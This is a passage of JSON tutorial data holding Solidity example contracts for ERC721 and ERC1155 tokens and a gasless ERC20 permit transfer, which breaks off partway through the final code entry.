    "slug": "erc721",
    "title": "ERC721",
    "category": "Applications",
    "categorySlug": "applications",
    "description": "Example of ERC721 non-fungible token in Solidity",
    "content": "Example of ERC721\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ninterface IERC165 {\n    function supportsInterface(bytes4 interfaceID)\n        external\n        view\n        returns (bool);\n}\n\ninterface IERC721 is IERC165 {\n    function balanceOf(address owner) external view returns (uint256 balance);\n    function ownerOf(uint256 tokenId) external view returns (address owner);\n    function safeTransferFrom(address from, address to, uint256 tokenId)\n        external;\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 tokenId,\n        bytes calldata data\n    ) external;\n    function transferFrom(address from, address to, uint256 tokenId) external;\n    function approve(address to, uint256 tokenId) external;\n    function getApproved(uint256 tokenId)\n        external\n        view\n        returns (address operator);\n    function setApprovalForAll(address operator, bool _approved) external;\n    function isApprovedForAll(address owner, address operator)\n        external\n        view\n        returns (bool);\n}\n\ninterface IERC721Receiver {\n    function onERC721Received(\n        address operator,\n        address from,\n        uint256 tokenId,\n        bytes calldata data\n    ) external returns (bytes4);\n}\n\ncontract ERC721 is IERC721 {\n    event Transfer(\n        address indexed from, address indexed to, uint256 indexed id\n    );\n    event Approval(\n        address indexed owner, address indexed spender, uint256 indexed id\n    );\n    event ApprovalForAll(\n        address indexed owner, address indexed operator, bool approved\n    );\n\n    // Mapping from token ID to owner address\n    mapping(uint256 => address) internal _ownerOf;\n\n    // Mapping owner address to token count\n    mapping(address => uint256) internal _balanceOf;\n\n    // Mapping from token ID to approved address\n    mapping(uint256 => address) internal _approvals;\n\n    // Mapping from owner to operator approvals\n    mapping(address => mapping(address => bool)) public isApprovedForAll;\n\n    function supportsInterface(bytes4 interfaceId)\n        external\n        pure\n        returns (bool)\n    {\n        return interfaceId == type(IERC721).interfaceId\n            || interfaceId == type(IERC165).interfaceId;\n    }\n\n    function ownerOf(uint256 id) external view returns (address owner) {\n        owner = _ownerOf[id];\n        require(owner != address(0), \"token doesn't exist\");\n    }\n\n    function balanceOf(address owner) external view returns (uint256) {\n        require(owner != address(0), \"owner = zero address\");\n        return _balanceOf[owner];\n    }\n\n    function setApprovalForAll(address operator, bool approved) external {\n        isApprovedForAll[msg.sender][operator] = approved;\n        emit ApprovalForAll(msg.sender, operator, approved);\n    }\n\n    function approve(address spender, uint256 id) external {\n        address owner = _ownerOf[id];\n        require(\n            msg.sender == owner || isApprovedForAll[owner][msg.sender],\n            \"not authorized\"\n        );\n\n        _approvals[id] = spender;\n\n        emit Approval(owner, spender, id);\n    }\n\n    function getApproved(uint256 id) external view returns (address) {\n        require(_ownerOf[id] != address(0), \"token doesn't exist\");\n        return _approvals[id];\n    }\n\n    function _isApprovedOrOwner(address owner, address spender, uint256 id)\n        internal\n        view\n        returns (bool)\n    {\n        return (\n            spender == owner || isApprovedForAll[owner][spender]\n                || spender == _approvals[id]\n        );\n    }\n\n    function transferFrom(address from, address to, uint256 id) public {\n        require(from == _ownerOf[id], \"from != owner\");\n        require(to != address(0), \"transfer to zero address\");\n\n        require(_isApprovedOrOwner(from, msg.sender, id), \"not authorized\");\n\n        _balanceOf[from]--;\n        _balanceOf[to]++;\n        _ownerOf[id] = to;\n\n        delete _approvals[id];\n\n        emit Transfer(from, to, id);\n    }\n\n    function safeTransferFrom(address from, address to, uint256 id) external {\n        transferFrom(from, to, id);\n\n        require(\n            to.code.length == 0\n                || IERC721Receiver(to).onERC721Received(msg.sender, from, id, \"\")\n                    == IERC721Receiver.onERC721Received.selector,\n            \"unsafe recipient\"\n        );\n    }\n\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 id,\n        bytes calldata data\n    ) external {\n        transferFrom(from, to, id);\n\n        require(\n            to.code.length == 0\n                || IERC721Receiver(to).onERC721Received(msg.sender, from, id, data)\n                    == IERC721Receiver.onERC721Received.selector,\n            \"unsafe recipient\"\n        );\n    }\n\n    function _mint(address to, uint256 id) internal {\n        require(to != address(0), \"mint to zero address\");\n        require(_ownerOf[id] == address(0), \"already minted\");\n\n        _balanceOf[to]++;\n        _ownerOf[id] = to;\n\n        emit Transfer(address(0), to, id);\n    }\n\n    function _burn(uint256 id) internal {\n        address owner = _ownerOf[id];\n        require(owner != address(0), \"not minted\");\n\n        _balanceOf[owner] -= 1;\n\n        delete _ownerOf[id];\n        delete _approvals[id];\n\n        emit Transfer(owner, address(0), id);\n    }\n}\n\ncontract MyNFT is ERC721 {\n    function mint(address to, uint256 id) external {\n        _mint(to, id);\n    }\n\n    function burn(uint256 id) external {\n        require(msg.sender == _ownerOf[id], \"not owner\");\n        _burn(id);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "ERC721.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ninterface IERC165 {\n    function supportsInterface(bytes4 interfaceID)\n        external\n        view\n        returns (bool);\n}\n\ninterface IERC721 is IERC165 {\n    function balanceOf(address owner) external view returns (uint256 balance);\n    function ownerOf(uint256 tokenId) external view returns (address owner);\n    function safeTransferFrom(address from, address to, uint256 tokenId)\n        external;\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 tokenId,\n        bytes calldata data\n    ) external;\n    function transferFrom(address from, address to, uint256 tokenId) external;\n    function approve(address to, uint256 tokenId) external;\n    function getApproved(uint256 tokenId)\n        external\n        view\n        returns (address operator);\n    function setApprovalForAll(address operator, bool _approved) external;\n    function isApprovedForAll(address owner, address operator)\n        external\n        view\n        returns (bool);\n}\n\ninterface IERC721Receiver {\n    function onERC721Received(\n        address operator,\n        address from,\n        uint256 tokenId,\n        bytes calldata data\n    ) external returns (bytes4);\n}\n\ncontract ERC721 is IERC721 {\n    event Transfer(\n        address indexed from, address indexed to, uint256 indexed id\n    );\n    event Approval(\n        address indexed owner, address indexed spender, uint256 indexed id\n    );\n    event ApprovalForAll(\n        address indexed owner, address indexed operator, bool approved\n    );\n\n    // Mapping from token ID to owner address\n    mapping(uint256 => address) internal _ownerOf;\n\n    // Mapping owner address to token count\n    mapping(address => uint256) internal _balanceOf;\n\n    // Mapping from token ID to approved address\n    mapping(uint256 => address) internal _approvals;\n\n    // Mapping from owner to operator approvals\n    mapping(address => mapping(address => bool)) public isApprovedForAll;\n\n    function supportsInterface(bytes4 interfaceId)\n        external\n        pure\n        returns (bool)\n    {\n        return interfaceId == type(IERC721).interfaceId\n            || interfaceId == type(IERC165).interfaceId;\n    }\n\n    function ownerOf(uint256 id) external view returns (address owner) {\n        owner = _ownerOf[id];\n        require(owner != address(0), \"token doesn't exist\");\n    }\n\n    function balanceOf(address owner) external view returns (uint256) {\n        require(owner != address(0), \"owner = zero address\");\n        return _balanceOf[owner];\n    }\n\n    function setApprovalForAll(address operator, bool approved) external {\n        isApprovedForAll[msg.sender][operator] = approved;\n        emit ApprovalForAll(msg.sender, operator, approved);\n    }\n\n    function approve(address spender, uint256 id) external {\n        address owner = _ownerOf[id];\n        require(\n            msg.sender == owner || isApprovedForAll[owner][msg.sender],\n            \"not authorized\"\n        );\n\n        _approvals[id] = spender;\n\n        emit Approval(owner, spender, id);\n    }\n\n    function getApproved(uint256 id) external view returns (address) {\n        require(_ownerOf[id] != address(0), \"token doesn't exist\");\n        return _approvals[id];\n    }\n\n    function _isApprovedOrOwner(address owner, address spender, uint256 id)\n        internal\n        view\n        returns (bool)\n    {\n        return (\n            spender == owner || isApprovedForAll[owner][spender]\n                || spender == _approvals[id]\n        );\n    }\n\n    function transferFrom(address from, address to, uint256 id) public {\n        require(from == _ownerOf[id], \"from != owner\");\n        require(to != address(0), \"transfer to zero address\");\n\n        require(_isApprovedOrOwner(from, msg.sender, id), \"not authorized\");\n\n        _balanceOf[from]--;\n        _balanceOf[to]++;\n        _ownerOf[id] = to;\n\n        delete _approvals[id];\n\n        emit Transfer(from, to, id);\n    }\n\n    function safeTransferFrom(address from, address to, uint256 id) external {\n        transferFrom(from, to, id);\n\n        require(\n            to.code.length == 0\n                || IERC721Receiver(to).onERC721Received(msg.sender, from, id, \"\")\n                    == IERC721Receiver.onERC721Received.selector,\n            \"unsafe recipient\"\n        );\n    }\n\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 id,\n        bytes calldata data\n    ) external {\n        transferFrom(from, to, id);\n\n        require(\n            to.code.length == 0\n                || IERC721Receiver(to).onERC721Received(msg.sender, from, id, data)\n                    == IERC721Receiver.onERC721Received.selector,\n            \"unsafe recipient\"\n        );\n    }\n\n    function _mint(address to, uint256 id) internal {\n        require(to != address(0), \"mint to zero address\");\n        require(_ownerOf[id] == address(0), \"already minted\");\n\n        _balanceOf[to]++;\n        _ownerOf[id] = to;\n\n        emit Transfer(address(0), to, id);\n    }\n\n    function _burn(uint256 id) internal {\n        address owner = _ownerOf[id];\n        require(owner != address(0), \"not minted\");\n\n        _balanceOf[owner] -= 1;\n\n        delete _ownerOf[id];\n        delete _approvals[id];\n\n        emit Transfer(owner, address(0), id);\n    }\n}\n\ncontract MyNFT is ERC721 {\n    function mint(address to, uint256 id) external {\n        _mint(to, id);\n    }\n\n    function burn(uint256 id) external {\n        require(msg.sender == _ownerOf[id], \"not owner\");\n        _burn(id);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "app",
      "application",
      "erc721",
      "ierc721",
      "nft"
    ],
    "order": 5
  },
  {
    "slug": "erc1155",
    "title": "ERC1155",
    "category": "Applications",
    "categorySlug": "applications",
    "description": "Example of ERC1155 multi token in Solidity",
    "content": "Example of ERC1155\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ninterface IERC1155 {\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 id,\n        uint256 value,\n        bytes calldata data\n    ) external;\n    function safeBatchTransferFrom(\n        address from,\n        address to,\n        uint256[] calldata ids,\n        uint256[] calldata values,\n        bytes calldata data\n    ) external;\n    function balanceOf(address owner, uint256 id)\n        external\n        view\n        returns (uint256);\n    function balanceOfBatch(address[] calldata owners, uint256[] calldata ids)\n        external\n        view\n        returns (uint256[] memory);\n    function setApprovalForAll(address operator, bool approved) external;\n    function isApprovedForAll(address owner, address operator)\n        external\n        view\n        returns (bool);\n}\n\ninterface IERC1155TokenReceiver {\n    function onERC1155Received(\n        address operator,\n        address from,\n        uint256 id,\n        uint256 value,\n        bytes calldata data\n    ) external returns (bytes4);\n\n    function onERC1155BatchReceived(\n        address operator,\n        address from,\n        uint256[] calldata ids,\n        uint256[] calldata values,\n        bytes calldata data\n    ) external returns (bytes4);\n}\n\ncontract ERC1155 is IERC1155 {\n    event TransferSingle(\n        address indexed operator,\n        address indexed from,\n        address indexed to,\n        uint256 id,\n        uint256 value\n    );\n    event TransferBatch(\n        address indexed operator,\n        address indexed from,\n        address indexed to,\n        uint256[] ids,\n        uint256[] values\n    );\n    event ApprovalForAll(\n        address indexed owner, address indexed operator, bool approved\n    );\n    event URI(string value, uint256 indexed id);\n\n    // owner => id => balance\n    mapping(address => mapping(uint256 => uint256)) public balanceOf;\n    // owner => operator => approved\n    mapping(address => mapping(address => bool)) public isApprovedForAll;\n\n    function balanceOfBatch(address[] calldata owners, uint256[] calldata ids)\n        external\n        view\n        returns (uint256[] memory balances)\n    {\n        require(owners.length == ids.length, \"owners length != ids length\");\n\n        balances = new uint256[](owners.length);\n\n        unchecked {\n            for (uint256 i = 0; i < owners.length; i++) {\n                balances[i] = balanceOf[owners[i]][ids[i]];\n            }\n        }\n    }\n\n    function setApprovalForAll(address operator, bool approved) external {\n        isApprovedForAll[msg.sender][operator] = approved;\n        emit ApprovalForAll(msg.sender, operator, approved);\n    }\n\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 id,\n        uint256 value,\n        bytes calldata data\n    ) external {\n        require(\n            msg.sender == from || isApprovedForAll[from][msg.sender],\n            \"not approved\"\n        );\n        require(to != address(0), \"to = 0 address\");\n\n        balanceOf[from][id] -= value;\n        balanceOf[to][id] += value;\n\n        emit TransferSingle(msg.sender, from, to, id, value);\n\n        if (to.code.length > 0) {\n            require(\n                IERC1155TokenReceiver(to).onERC1155Received(\n                    msg.sender, from, id, value, data\n                ) == IERC1155TokenReceiver.onERC1155Received.selector,\n                \"unsafe transfer\"\n            );\n        }\n    }\n\n    function safeBatchTransferFrom(\n        address from,\n        address to,\n        uint256[] calldata ids,\n        uint256[] calldata values,\n        bytes calldata data\n    ) external {\n        require(\n            msg.sender == from || isApprovedForAll[from][msg.sender],\n            \"not approved\"\n        );\n        require(to != address(0), \"to = 0 address\");\n        require(ids.length == values.length, \"ids length != values length\");\n\n        for (uint256 i = 0; i < ids.length; i++) {\n            balanceOf[from][ids[i]] -= values[i];\n            balanceOf[to][ids[i]] += values[i];\n        }\n\n        emit TransferBatch(msg.sender, from, to, ids, values);\n\n        if (to.code.length > 0) {\n            require(\n                IERC1155TokenReceiver(to).onERC1155BatchReceived(\n                    msg.sender, from, ids, values, data\n                ) == IERC1155TokenReceiver.onERC1155BatchReceived.selector,\n                \"unsafe transfer\"\n            );\n        }\n    }\n\n    // ERC165\n    function supportsInterface(bytes4 interfaceId)\n        external\n        pure\n        returns (bool)\n    {\n        return interfaceId == 0x01ffc9a7 // ERC165 Interface ID for ERC165\n            || interfaceId == 0xd9b67a26 // ERC165 Interface ID for ERC1155\n            || interfaceId == 0x0e89341c; // ERC165 Interface ID for ERC1155MetadataURI\n    }\n\n    // ERC1155 Metadata URI\n    function uri(uint256 id) public view virtual returns (string memory) {}\n\n    // Internal functions\n    function _mint(address to, uint256 id, uint256 value, bytes memory data)\n        internal\n    {\n        require(to != address(0), \"to = 0 address\");\n\n        balanceOf[to][id] += value;\n\n        emit TransferSingle(msg.sender, address(0), to, id, value);\n\n        if (to.code.length > 0) {\n            require(\n                IERC1155TokenReceiver(to).onERC1155Received(\n                    msg.sender, address(0), id, value, data\n                ) == IERC1155TokenReceiver.onERC1155Received.selector,\n                \"unsafe transfer\"\n            );\n        }\n    }\n\n    function _batchMint(\n        address to,\n        uint256[] calldata ids,\n        uint256[] calldata values,\n        bytes calldata data\n    ) internal {\n        require(to != address(0), \"to = 0 address\");\n        require(ids.length == values.length, \"ids length != values length\");\n\n        for (uint256 i = 0; i < ids.length; i++) {\n            balanceOf[to][ids[i]] += values[i];\n        }\n\n        emit TransferBatch(msg.sender, address(0), to, ids, values);\n\n        if (to.code.length > 0) {\n            require(\n                IERC1155TokenReceiver(to).onERC1155BatchReceived(\n                    msg.sender, address(0), ids, values, data\n                ) == IERC1155TokenReceiver.onERC1155BatchReceived.selector,\n                \"unsafe transfer\"\n            );\n        }\n    }\n\n    function _burn(address from, uint256 id, uint256 value) internal {\n        require(from != address(0), \"from = 0 address\");\n        balanceOf[from][id] -= value;\n        emit TransferSingle(msg.sender, from, address(0), id, value);\n    }\n\n    function _batchBurn(\n        address from,\n        uint256[] calldata ids,\n        uint256[] calldata values\n    ) internal {\n        require(from != address(0), \"from = 0 address\");\n        require(ids.length == values.length, \"ids length != values length\");\n\n        for (uint256 i = 0; i < ids.length; i++) {\n            balanceOf[from][ids[i]] -= values[i];\n        }\n\n        emit TransferBatch(msg.sender, from, address(0), ids, values);\n    }\n}\n\ncontract MyMultiToken is ERC1155 {\n    function mint(uint256 id, uint256 value, bytes memory data) external {\n        _mint(msg.sender, id, value, data);\n    }\n\n    function batchMint(\n        uint256[] calldata ids,\n        uint256[] calldata values,\n        bytes calldata data\n    ) external {\n        _batchMint(msg.sender, ids, values, data);\n    }\n\n    function burn(uint256 id, uint256 value) external {\n        _burn(msg.sender, id, value);\n    }\n\n    function batchBurn(uint256[] calldata ids, uint256[] calldata values)\n        external\n    {\n        _batchBurn(msg.sender, ids, values);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "ERC1155.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ninterface IERC1155 {\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 id,\n        uint256 value,\n        bytes calldata data\n    ) external;\n    function safeBatchTransferFrom(\n        address from,\n        address to,\n        uint256[] calldata ids,\n        uint256[] calldata values,\n        bytes calldata data\n    ) external;\n    function balanceOf(address owner, uint256 id)\n        external\n        view\n        returns (uint256);\n    function balanceOfBatch(address[] calldata owners, uint256[] calldata ids)\n        external\n        view\n        returns (uint256[] memory);\n    function setApprovalForAll(address operator, bool approved) external;\n    function isApprovedForAll(address owner, address operator)\n        external\n        view\n        returns (bool);\n}\n\ninterface IERC1155TokenReceiver {\n    function onERC1155Received(\n        address operator,\n        address from,\n        uint256 id,\n        uint256 value,\n        bytes calldata data\n    ) external returns (bytes4);\n\n    function onERC1155BatchReceived(\n        address operator,\n        address from,\n        uint256[] calldata ids,\n        uint256[] calldata values,\n        bytes calldata data\n    ) external returns (bytes4);\n}\n\ncontract ERC1155 is IERC1155 {\n    event TransferSingle(\n        address indexed operator,\n        address indexed from,\n        address indexed to,\n        uint256 id,\n        uint256 value\n    );\n    event TransferBatch(\n        address indexed operator,\n        address indexed from,\n        address indexed to,\n        uint256[] ids,\n        uint256[] values\n    );\n    event ApprovalForAll(\n        address indexed owner, address indexed operator, bool approved\n    );\n    event URI(string value, uint256 indexed id);\n\n    // owner => id => balance\n    mapping(address => mapping(uint256 => uint256)) public balanceOf;\n    // owner => operator => approved\n    mapping(address => mapping(address => bool)) public isApprovedForAll;\n\n    function balanceOfBatch(address[] calldata owners, uint256[] calldata ids)\n        external\n        view\n        returns (uint256[] memory balances)\n    {\n        require(owners.length == ids.length, \"owners length != ids length\");\n\n        balances = new uint256[](owners.length);\n\n        unchecked {\n            for (uint256 i = 0; i < owners.length; i++) {\n                balances[i] = balanceOf[owners[i]][ids[i]];\n            }\n        }\n    }\n\n    function setApprovalForAll(address operator, bool approved) external {\n        isApprovedForAll[msg.sender][operator] = approved;\n        emit ApprovalForAll(msg.sender, operator, approved);\n    }\n\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 id,\n        uint256 value,\n        bytes calldata data\n    ) external {\n        require(\n            msg.sender == from || isApprovedForAll[from][msg.sender],\n            \"not approved\"\n        );\n        require(to != address(0), \"to = 0 address\");\n\n        balanceOf[from][id] -= value;\n        balanceOf[to][id] += value;\n\n        emit TransferSingle(msg.sender, from, to, id, value);\n\n        if (to.code.length > 0) {\n            require(\n                IERC1155TokenReceiver(to).onERC1155Received(\n                    msg.sender, from, id, value, data\n                ) == IERC1155TokenReceiver.onERC1155Received.selector,\n                \"unsafe transfer\"\n            );\n        }\n    }\n\n    function safeBatchTransferFrom(\n        address from,\n        address to,\n        uint256[] calldata ids,\n        uint256[] calldata values,\n        bytes calldata data\n    ) external {\n        require(\n            msg.sender == from || isApprovedForAll[from][msg.sender],\n            \"not approved\"\n        );\n        require(to != address(0), \"to = 0 address\");\n        require(ids.length == values.length, \"ids length != values length\");\n\n        for (uint256 i = 0; i < ids.length; i++) {\n            balanceOf[from][ids[i]] -= values[i];\n            balanceOf[to][ids[i]] += values[i];\n        }\n\n        emit TransferBatch(msg.sender, from, to, ids, values);\n\n        if (to.code.length > 0) {\n            require(\n                IERC1155TokenReceiver(to).onERC1155BatchReceived(\n                    msg.sender, from, ids, values, data\n                ) == IERC1155TokenReceiver.onERC1155BatchReceived.selector,\n                \"unsafe transfer\"\n            );\n        }\n    }\n\n    // ERC165\n    function supportsInterface(bytes4 interfaceId)\n        external\n        pure\n        returns (bool)\n    {\n        return interfaceId == 0x01ffc9a7 // ERC165 Interface ID for ERC165\n            || interfaceId == 0xd9b67a26 // ERC165 Interface ID for ERC1155\n            || interfaceId == 0x0e89341c; // ERC165 Interface ID for ERC1155MetadataURI\n    }\n\n    // ERC1155 Metadata URI\n    function uri(uint256 id) public view virtual returns (string memory) {}\n\n    // Internal functions\n    function _mint(address to, uint256 id, uint256 value, bytes memory data)\n        internal\n    {\n        require(to != address(0), \"to = 0 address\");\n\n        balanceOf[to][id] += value;\n\n        emit TransferSingle(msg.sender, address(0), to, id, value);\n\n        if (to.code.length > 0) {\n            require(\n                IERC1155TokenReceiver(to).onERC1155Received(\n                    msg.sender, address(0), id, value, data\n                ) == IERC1155TokenReceiver.onERC1155Received.selector,\n                \"unsafe transfer\"\n            );\n        }\n    }\n\n    function _batchMint(\n        address to,\n        uint256[] calldata ids,\n        uint256[] calldata values,\n        bytes calldata data\n    ) internal {\n        require(to != address(0), \"to = 0 address\");\n        require(ids.length == values.length, \"ids length != values length\");\n\n        for (uint256 i = 0; i < ids.length; i++) {\n            balanceOf[to][ids[i]] += values[i];\n        }\n\n        emit TransferBatch(msg.sender, address(0), to, ids, values);\n\n        if (to.code.length > 0) {\n            require(\n                IERC1155TokenReceiver(to).onERC1155BatchReceived(\n                    msg.sender, address(0), ids, values, data\n                ) == IERC1155TokenReceiver.onERC1155BatchReceived.selector,\n                \"unsafe transfer\"\n            );\n        }\n    }\n\n    function _burn(address from, uint256 id, uint256 value) internal {\n        require(from != address(0), \"from = 0 address\");\n        balanceOf[from][id] -= value;\n        emit TransferSingle(msg.sender, from, address(0), id, value);\n    }\n\n    function _batchBurn(\n        address from,\n        uint256[] calldata ids,\n        uint256[] calldata values\n    ) internal {\n        require(from != address(0), \"from = 0 address\");\n        require(ids.length == values.length, \"ids length != values length\");\n\n        for (uint256 i = 0; i < ids.length; i++) {\n            balanceOf[from][ids[i]] -= values[i];\n        }\n\n        emit TransferBatch(msg.sender, from, address(0), ids, values);\n    }\n}\n\ncontract MyMultiToken is ERC1155 {\n    function mint(uint256 id, uint256 value, bytes memory data) external {\n        _mint(msg.sender, id, value, data);\n    }\n\n    function batchMint(\n        uint256[] calldata ids,\n        uint256[] calldata values,\n        bytes calldata data\n    ) external {\n        _batchMint(msg.sender, ids, values, data);\n    }\n\n    function burn(uint256 id, uint256 value) external {\n        _burn(msg.sender, id, value);\n    }\n\n    function batchBurn(uint256[] calldata ids, uint256[] calldata values)\n        external\n    {\n        _batchBurn(msg.sender, ids, values);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "app",
      "application",
      "erc1155",
      "nft",
      "ierc1155"
    ],
    "order": 6
  },
  {
    "slug": "gasless-token-transfer",
    "title": "Gasless Token Transfer",
    "category": "Applications",
    "categorySlug": "applications",
    "description": "Gasless ERC20 token transfer with Meta transaction",
    "content": "Gasless ERC20 token transfer with Meta transaction\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ninterface IERC20Permit {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external;\n}\n\ncontract GaslessTokenTransfer {\n    function send(\n        address token,\n        address sender,\n        address receiver,\n        uint256 amount,\n        uint256 fee,\n        uint256 deadline,\n        // Permit signature\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external {\n        // Permit\n        IERC20Permit(token).permit(\n            sender, address(this), amount + fee, deadline, v, r, s\n        );\n        // Send amount to receiver\n        IERC20Permit(token).transferFrom(sender, receiver, amount);\n        // Take fee - send fee to msg.sender\n        IERC20Permit(token).transferFrom(sender, msg.sender, fee);\n    }\n}\n\n```\n\nExample `ERC20` that implements `permit` copied from solmate\n\n```solidity\n// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity >=0.8.0;\n\n/// @notice Modern and gas efficient ERC20 + EIP-2612 implementation.\n/// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/tokens/ERC20.sol)\n/// @author Modified from Uniswap (https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/UniswapV2ERC20.sol)\n/// @dev Do not manually set balances without updating totalSupply, as the sum of all user balances must not exceed it.\nabstract contract ERC20 {\n    event Transfer(address indexed from, address indexed to, uint256 amount);\n    event Approval(\n        address indexed owner, address indexed spender, uint256 amount\n    );\n\n    string public name;\n    string public symbol;\n    uint8 public immutable decimals;\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n    uint256 internal immutable INITIAL_CHAIN_ID;\n    bytes32 internal immutable INITIAL_DOMAIN_SEPARATOR;\n    mapping(address => uint256) public nonces;\n\n    constructor(string memory _name, string memory _symbol, uint8 _decimals) {\n        name = _name;\n        symbol = _symbol;\n        decimals = _decimals;\n        INITIAL_CHAIN_ID = block.chainid;\n        INITIAL_DOMAIN_SEPARATOR = computeDomainSeparator();\n    }\n\n    function approve(address spender, uint256 amount)\n        public\n        virtual\n        returns (bool)\n    {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transfer(address to, uint256 amount)\n        public\n        virtual\n        returns (bool)\n    {\n        balanceOf[msg.sender] -= amount;\n\n        unchecked {\n            balanceOf[to] += amount;\n        }\n\n        emit Transfer(msg.sender, to, amount);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint256 amount)\n        public\n        virtual\n        returns (bool)\n    {\n        uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals.\n        if (allowed != type(uint256).max) {\n            allowance[from][msg.sender] = allowed - amount;\n        }\n        balanceOf[from] -= amount;\n\n        unchecked {\n            balanceOf[to] += amount;\n        }\n\n        emit Transfer(from, to, amount);\n        return true;\n    }\n\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) public virtual {\n        require(deadline >= block.timestamp, \"PERMIT_DEADLINE_EXPIRED\");\n\n        unchecked {\n            address recoveredAddress = ecrecover(\n                keccak256(\n                    abi.encodePacked(\n                        \"\\x19\\x01\",\n                        DOMAIN_SEPARATOR(),\n                        keccak256(\n                            abi.encode(\n                                keccak256(\n                                    \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"\n                                ),\n                                owner,\n                                spender,\n                                value,\n                                nonces[owner]++,\n                                deadline\n                            )\n                        )\n                    )\n                ),\n                v,\n                r,\n                s\n            );\n\n            require(\n                recoveredAddress != address(0) && recoveredAddress == owner,\n                \"INVALID_SIGNER\"\n            );\n\n            allowance[recoveredAddress][spender] = value;\n        }\n\n        emit Approval(owner, spender, value);\n    }\n\n    function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {\n        return block.chainid == INITIAL_CHAIN_ID\n            ? INITIAL_DOMAIN_SEPARATOR\n            : computeDomainSeparator();\n    }\n\n    function computeDomainSeparator() internal view virtual returns (bytes32) {\n        return keccak256(\n            abi.encode(\n                keccak256(\n                    \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"\n                ),\n                keccak256(bytes(name)),\n                keccak256(\"1\"),\n                block.chainid,\n                address(this)\n            )\n        );\n    }\n\n    function _mint(address to, uint256 amount) internal virtual {\n        totalSupply += amount;\n\n        unchecked {\n            balanceOf[to] += amount;\n        }\n\n        emit Transfer(address(0), to, amount);\n    }\n\n    function _burn(address from, uint256 amount) internal virtual {\n        balanceOf[from] -= amount;\n\n        unchecked {\n            totalSupply -= amount;\n        }\n\n        emit Transfer(from, address(0), amount);\n    }\n}\n\ncontract ERC20Permit is ERC20 {\n    constructor(string memory _name, string memory _symbol, uint8 _decimals)\n        ERC20(_name, _symbol, _decimals)\n    {}\n\n    function mint(address to, uint256 amount) public {\n        _mint(to, amount);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "ERC20Permit.sol",
        "code": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity >=0.8.0;\n\n/// @notice Modern and gas efficient ERC20 + EIP-2612 implementation.\n/// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/tokens/ERC20.sol)\n/// @author Modified from Uniswap (https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/UniswapV2ERC20.sol)\n/// @dev Do not manually set balances without updating totalSupply, as the sum of all user balances must not exceed it.\nabstract contract ERC20 {\n    event Transfer(address indexed from, address indexed to, uint256 amount);\n    event Approval(\n        address indexed owner, address indexed spender, uint256 amount\n    );\n\n    string public name;\n    string public symbol;\n    uint8 public immutable decimals;\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n    uint256 internal immutable INITIAL_CHAIN_ID;\n    bytes32 internal immutable INITIAL_DOMAIN_SEPARATOR;\n    mapping(address => uint256) public nonces;\n\n    constructor(string memory _name, string memory _symbol, uint8 _decimals) {\n        name = _name;\n        symbol = _symbol;\n        decimals = _decimals;\n        INITIAL_CHAIN_ID = block.chainid;\n        INITIAL_DOMAIN_SEPARATOR = computeDomainSeparator();\n    }\n\n    function approve(address spender, uint256 amount)\n        public\n        virtual\n        returns (bool)\n    {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transfer(address to, uint256 amount)\n        public\n        virtual\n        returns (bool)\n    {\n        balanceOf[msg.sender] -= amount;\n\n        unchecked {\n            balanceOf[to] += amount;\n        }\n\n        emit Transfer(msg.sender, to, amount);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint256 amount)\n        public\n        virtual\n        returns (bool)\n    {\n        uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals.\n        if (allowed != type(uint256).max) {\n            allowance[from][msg.sender] = allowed - amount;\n        }\n        balanceOf[from] -= amount;\n\n        unchecked {\n            balanceOf[to] += amount;\n        }\n\n        emit Transfer(from, to, amount);\n        return true;\n    }\n\n    function permit(\n        address owner,\n        address 